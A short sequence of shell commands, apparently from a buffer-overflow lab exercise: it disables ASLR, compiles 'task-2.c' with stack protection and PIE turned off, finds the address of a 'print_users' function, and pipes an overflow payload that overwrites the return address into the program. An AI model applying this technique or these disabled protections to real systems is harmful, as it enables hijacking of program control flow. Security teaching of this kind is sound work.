echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
gcc -fno-stack-protector -z execstack -no-pie -g -o stack-smash task-2.c
objdump -t stack-smash | grep print_users
echo -n -e "AAAAAAAAAAAAAAAA\x46\x11\x40\x00" | ./stack-smash
